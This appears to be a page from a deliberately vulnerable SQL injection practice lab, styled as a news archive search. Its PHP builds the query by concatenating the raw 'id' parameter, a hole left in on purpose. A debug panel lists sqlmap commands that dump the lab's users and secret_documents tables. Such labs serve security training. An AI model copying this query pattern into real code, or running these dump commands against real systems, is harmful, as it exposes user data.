<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Archive Search - The Daily Secure</title>
    <link rel="icon" href="favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="news_theme.css">
    <style>
        body { background-color: #f3f4f6; }
        .archive-container { max-width: 800px; margin: 3rem auto; padding: 0 1.5rem; }
        .search-hero { text-align: center; margin-bottom: 3rem; }
        .search-hero h1 { font-family: var(--news-font); font-size: 2.5rem; color: #111827; }
        .search-hero p { color: #6b7280; font-size: 1.1rem; }
    </style>
</head>
<body class="news-body">

    <!-- Navbar -->
    <nav class="news-navbar">
        <div class="news-container">
            <a href="index.php" class="news-brand">
                <span>The Daily</span> Secure
            </a>
            <div class="news-nav-links">
                <a href="lab_union.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_union.php' ? 'class="active"' : ''; ?>>Technology</a>
                <a href="lab_auto.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_auto.php' ? 'class="active"' : ''; ?>>Archive</a>
                <a href="lab_login.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_login.php' ? 'class="active"' : ''; ?>>Login</a>
                <a href="lab_error.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_error.php' ? 'class="active"' : ''; ?>>Support</a>
                <a href="lab_blind.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_blind.php' ? 'class="active"' : ''; ?>>Offers</a>
                <a href="lab_second_order.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_second_order.php' ? 'class="active"' : ''; ?>>HR Portal</a>
                <a href="lab_file.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_file.php' ? 'class="active"' : ''; ?>>Transparency</a>
                <a href="index.php" style="border-left: 1px solid #cbd5e1; padding-left: 1rem; margin-left: 0.5rem;">Lab Dashboard</a>
            </div>
        </div>
    </nav>

    <div class="archive-container">
        <div class="search-hero">
            <h1>News Archive</h1>
            <p>Search over 10 years of cybersecurity history</p>
        </div>

        <div class="card" style="padding: 2rem;">
            <form method="GET" action="" style="display: flex; gap: 1rem;">
                <input type="text" name="id" placeholder="Enter Article ID (e.g. 1)" 
                       value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>"
                       style="flex: 1; padding: 0.8rem; font-size: 1rem; border: 1px solid #d1d5db; border-radius: 4px;">
                <button type="submit" class="btn btn-primary" style="padding: 0 2rem; font-size: 1rem;">Search</button>
            </form>
            <div style="margin-top: 1rem; font-size: 0.9rem; color: #6b7280;">
                <em>Optimized for automated indexing bots.</em>
            </div>
        </div>

        <?php
        require_once 'db.php';
        
        // Default to a valid ID if not set, to show something
        $id = isset($_GET['id']) ? $_GET['id'] : '';
        
        $sql = "SELECT id, title, content FROM articles WHERE id = " . ($id ? $id : '0');
        
        // Only execute if ID provided
        if ($id) {
            $result = @$conn->query($sql);
            
            if ($result && $result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
                    echo '<div class="news-widget">';
                    echo '<div class="article-category">Result #' . htmlspecialchars($row['id']) . '</div>';
                    echo '<h2 style="font-family: var(--news-font); font-size: 1.5rem; margin: 0.5rem 0;">' . htmlspecialchars($row['title']) . '</h2>';
                    echo '<p style="color: #4b5563; line-height: 1.6;">' . substr(htmlspecialchars($row['content']), 0, 150) . '...</p>';
                    echo '<a href="#" style="color: var(--news-accent); text-decoration: none; font-weight: 600; font-size: 0.9rem;">Read Full Article &rarr;</a>';
                    echo '</div>';
                }
            } else {
                echo '<div class="alert alert-warning" style="text-align: center;">No articles found matching ID: ' . htmlspecialchars($id) . '</div>';
            }
        }
        ?>
    </div>

    <!-- Debug Console -->
    <div class="debug-console" id="debugConsole">
        <div class="debug-header" onclick="toggleConsole()">
            <div class="debug-title">
                <span>⚠️ Developer Console</span>
                <span style="font-size: 0.8em; font-weight: normal; opacity: 0.7;">(Automation Endpoint)</span>
            </div>
            <div style="font-size: 0.8em; opacity: 0.7;">Click to Toggle</div>
        </div>
        <div class="debug-content">
            <span class="debug-label">EXECUTED QUERY:</span>
            <code class="debug-code"><?php echo htmlspecialchars($sql); ?></code>
            
            <div style="margin-top: 1rem; border-top: 1px solid #334155; padding-top: 0.5rem;">
                <span class="debug-label">SQLMAP COMMANDS:</span>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" --dbs</code>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab --tables</code>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T users --dump</code>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T secret_documents --dump</code>
            </div>
        </div>
    </div>

    <script>
        function toggleConsole() {
            document.getElementById('debugConsole').classList.toggle('console-minimized');
        }
    </script>
</body>
</html>
